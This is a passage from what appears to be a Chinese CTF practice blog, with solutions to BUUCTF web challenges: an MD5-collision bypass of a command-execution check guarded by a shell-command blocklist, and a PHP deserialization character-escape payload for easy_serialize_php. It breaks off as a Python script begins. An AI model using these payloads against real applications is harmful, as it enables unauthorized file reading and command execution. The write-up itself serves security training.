</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|;|,|\*|\?|</span><span class="se">\\</span><span class="s2">|</span><span class="se">\\\\</span><span class="s2">|</span><span class="se">\n</span><span class="s2">|</span><span class="se">\t</span><span class="s2">|</span><span class="se">\r</span><span class="s2">|</span><span class="se">\xA0</span><span class="s2">|\{|\}|\(|\)|\&amp;[^\d]|@|\||</span><span class="se">\\</span><span class="s2">$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="s2">&#34;forbid ~&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="sb">`$cmd`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="p">(</span><span class="s2">&#34;md5 is funny ~&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåË¶Åmd5Âº∫ÊØîËæÉÁªïËøáÂè™ËÉΩÊâæpayload‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
</span></span><span class="line"><span class="cl">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</span></span><span class="line"><span class="cl">ÊàñËÄÖ
</span></span><span class="line"><span class="cl">a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222907878.png"
	width="1919"
	height="719"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222907878_hu12984690349972161922.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215222907878_hu3114976661799729823.png 1024w"
	loading="lazy"
	
		alt="image-20250215222907878"
	
	
		class="gallery-image" 
		data-flex-grow="266"
		data-flex-basis="640px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215223019692.png"
	width="1874"
	height="721"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215223019692_hu15115081612965511664.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215223019692_hu17755552159924547355.png 1024w"
	loading="lazy"
	
		alt="image-20250215223019692"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="623px"
	
></p>
<h2 id="mrctf2020pywebsite">[MRCTF2020]PYWebsite
</h2><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250216151521281.png"
	width="1755"
	height="615"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250216151521281_hu13492116411185021395.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250216151521281_hu6894982447828342798.png 1024w"
	loading="lazy"
	
		alt="image-20250216151521281"
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="684px"
	
></p>
<h2 id="ÂÆâÊ¥µÊùØ-2019easy_serialize_php">[ÂÆâÊ¥µÊùØ 2019]easy_serialize_php
</h2><p>Ê∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$function</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filter_arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;php5&#39;</span><span class="p">,</span><span class="s1">&#39;php4&#39;</span><span class="p">,</span><span class="s1">&#39;fl1g&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="nv">$filter_arr</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$img</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;function&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$function</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$function</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img_path&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="s1">&#39;guest_img.png&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img_path&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$serialize_info</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;highlight_file&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;phpinfo&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">);</span> <span class="c1">//maybe you can find something in here!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;show_image&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$userinfo</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$serialize_info</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$userinfo</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ª£Á†ÅÈÄªËæëÊòØextract‰º†ÂÖ•ÂèòÈáèÔºåÊîπÂèòsession[img]‰∏∫Âõ∫ÂÆöÂÄºÔºåÂ∫èÂàóÂåñsessionÁÑ∂ÂêéËøáÊª§ÔºåÂèçÂ∫èÂàóÂåñÔºåbase64Ëß£Á†ÅËØªÂèñÂÜÖÂÆπ</p>
<p>ÂÖàÁúãÁúãphpinfo,ÊâæÂà∞d0g3_f1ag.php</p>
<h3 id="phpÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏">phpÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏
</h3><p>Âú®php‰∏≠ÔºåÂèçÂ∫èÂàóÂåñÁöÑËøáÁ®ã‰∏≠ÂøÖÈ°ª‰∏•Ê†ºÊåâÁÖßÂ∫èÂàóÂåñËßÑÂàôÊâçËÉΩÊàêÂäüÂÆûÁé∞ÂèçÂ∫èÂàóÂåñÔºå‰ΩÜÂ¶ÇÊûúÊàë‰ª¨Âú®Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂêéÂä†ÈöèÊú∫Â≠óÁ¨¶‰∏≤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;a:2:{i:0;s:8:&#34;Hed9eh0g&#34;;i:1;s:5:&#34;aaaaa&#34;;}abc&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>‰ªªÁÑ∂ËæìÂá∫ÂéüÊù•ÁöÑÁªìÊûú,Âõ†‰∏∫‰ªñËØªÂà∞}Â∞±ÂÅúÊ≠¢‰∫ÜÔºå‰∏ç‰ºöËØªÂèñ}ÂêéÁöÑÂ≠óÁ¨¶‰∏≤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;flagflagflagflagflagflag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;function&#34;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;img&#34;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;L2QwZzNfZmxsbGxsbGFn&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    
</span></span></span><span class="line"><span class="cl"><span class="err">//a:3:{s:4:&#34;user&#34;;s:24:&#34;flagflagflagflagflagflag&#34;;s:8:&#34;function&#34;;s:59:&#34;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#34;;s:3:&#34;img&#34;;s:20:&#34;L2QwZzNfZmxsbGxsbGFn&#34;;}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁöÑfunctionÈáåÈù¢ÂºÄÂ§¥ÁöÑ<code>&quot;a</code>ÊòØ‰∏∫‰∫ÜÂ∫èÂàóÂåñ‰πãÂêéË∑üÂâçÈù¢ÁöÑ&quot;ÊãºÊé•</p>
<p>ÁÑ∂ÂêéÂõ†‰∏∫flag‰ºöË¢´Á©∫ÊõøÊç¢ÔºåÂèòÊàê</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a:3:{s:4:&#34;user&#34;;s:24:&#34;&#34;;s:8:&#34;function&#34;;s:59:&#34;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#34;;s:3:&#34;img&#34;;s:20:&#34;L2QwZzNfZmxsbGxsbGFn&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êú¨Êù•Áî±‰∫éÊúâ6‰∏™flagÂ≠óÁ¨¶ÊâÄ‰ª•‰∏∫24ÔºåÁé∞Âú®Ëøô6‰∏™flagÈÉΩË¢´ËøáÊª§‰∫ÜÔºåÈÇ£‰πàÂÆÉÂ∞Ü‰ºöÂ∞ùËØïÂêëÂêéËØªÂèñ24‰∏™Â≠óÁ¨¶ÁúãÁúãÊòØÂê¶Êª°Ë∂≥Â∫èÂàóÂåñÁöÑËßÑÂàôÔºå‰πüÂç≥ËØªÂèñ<code>;s:8:&quot;function&quot;;s:59:&quot;a</code>,ËØªÂèñËøô24‰∏™Â≠óÁ¨¶Âêé‰ª•<code>&quot;;</code>ÁªìÂ∞æÔºåÊÅ∞Â•ΩÊª°Ë∂≥ËßÑÂàôÔºåËÄåÂêéÁ¨¨‰∏â‰∏™sÂêëÂêéËØªÂèñimgÁöÑ20‰∏™Â≠óÁ¨¶ÔºåÁ¨¨Âõõ‰∏™„ÄÅÁ¨¨‰∫î‰∏™sÂêëÂêéËØªÂèñÂùáÊª°Ë∂≥ËßÑÂàô</p>
<p>ÊúÄÁªàÁªìÊûú‰∏∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array(3) { 
</span></span><span class="line"><span class="cl">[&#34;user&#34;]=&gt; string(24) &#34;&#34;;s:8:&#34;function&#34;;s:59:&#34;a&#34; 
</span></span><span class="line"><span class="cl">[&#34;img&#34;]=&gt; string(20) &#34;ZDBnM19mMWFnLnBocA==&#34; 
</span></span><span class="line"><span class="cl">[&#34;dd&#34;]=&gt; string(1) &#34;a&#34; 
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÊ†∑Â∞±ÊääÂéüÊù•‰∏çÂèØÂèòÁöÑImgÁªôÊõøÊç¢‰∫Ü</p>
<p>ÁÑ∂ÂêéÊàë‰ª¨‰º†ÂÖ•‰∏Ä‰∏™sessionËÆ©‰ªñÂ∫èÂàóÂåñÂ∞±Ë°å‰∫Ü,Êúâ‰∏§ÁßçÁªïËøáÂäûÊ≥ïÔºåÁ¨¨‰∏ÄÁßçËÆ©<code>__SESSION[flagflag]</code>‰º†ÂÖ•ÂºÄÂ§¥‰∏∫&quot;ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåËøôÊ†∑Â∫èÂàóÂåñÔºåÂ∞±‰ºöÊãºÊé•‰∏∫Á©∫ÈÄ†Êàê‰∏äÈù¢ÁöÑÁªïËøáÔºà‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÂ§çÁé∞‰∏ç‰∫ÜÔºâ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$_SESSION[&#39;flagflag&#39;]=&#39;&#34;;s:3:&#34;aaa&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}&#39;;
</span></span><span class="line"><span class="cl">    #ÁªìÊûú a:1:{s:8:&#34;flagflag&#34;;s:51:&#34;&#34;;s:3:&#34;aaa&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}&#34;;}ÔºåËøôÈáåÂ∞±ÈÄ†Êàêimg‰∏çÊàê‰∏∫‰∏Ä‰∏™ÈîÆÔºå‰πüÂ∞±Êó†Ê≥ïËøõË°åÂä†ÂØÜ
</span></span><span class="line"><span class="cl">    #ËøáÊª§ÊéâflagÊúâ
</span></span><span class="line"><span class="cl">    #a:1:{s:8:&#34;&#34;;s:51:&#34;&#34;;s:3:&#34;aaa&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}&#34;;}
</span></span><span class="line"><span class="cl">    #‰ΩøÂæóÁªïËøá;s:51:&#34;&#34;Âà∞Ëææ‰∏ã‰∏Ä‰∏™ÂàÜÂè∑ÔºåËøôÊó∂imgÊàêÂäüÈÄÉÈÄ∏Âá∫Êù•
</span></span></code></pre></td></tr></table>
</div>
</div><p>Á¨¨‰∫åÁßçÁõ¥Êé•ÊûÑÈÄ†‰∏â‰∏™session,ÁÑ∂ÂêéÂú®Á¨¨‰∏Ä‰∏™sessionÁöÑÂÄº‰º†ÂæàÂ§öflag,ËøáÊª§ÂêéÂ∞±‰ºöÂåπÈÖçÂêéÈù¢ÁöÑsessionÊù•ÊõøÊç¢img</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_SESSION[a]=phpflagflagflagflagflagflagflagflagflagflagflagflagflag&amp;_SESSION[img]=1&amp;_SESSION[exp]=;s:3:&#34;img&#34;;s:20:&#34;L2QwZzNfZmxsbGxsbGFn&#34;;i:0;i:1;}
</span></span><span class="line"><span class="cl">Â∫èÂàóÂåñÂêé
</span></span><span class="line"><span class="cl">&#34;a:3:{s:1:&#34;a&#34;;s:55:&#34;&#34;;s:3:&#34;img&#34;;s:20:&#34;Z3Vlc3RfaW1nLnBuZw==&#34;;s:3:&#34;exp&#34;;s:40:&#34;;s:3:&#34;img&#34;;s:20:&#34;L2QwZzNfZmxsbGxsbGFn&#34;;i:0;i:1;}&#34;;}&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:1:&#34;1&#34;;s:1:&#34;2&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="Âº∫ÁΩëÊùØ-2019È´òÊòéÁöÑÈªëÂÆ¢">[Âº∫ÁΩëÊùØ 2019]È´òÊòéÁöÑÈªëÂÆ¢
</h2><p>Áî®ËÑöÊú¨Á≠õÈÄâ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">thread_</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Semaphore</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="c1"># ËÆæÁΩÆÊúÄÂ§ßÁ∫øÁ®ãÊï∞ ,Âà´ËÆæÁΩÆÂ§™Â§ßÔºå‰∏çÁÑ∂ËøòÊòØ‰ºöÂ¥©ÁöÑ</span>
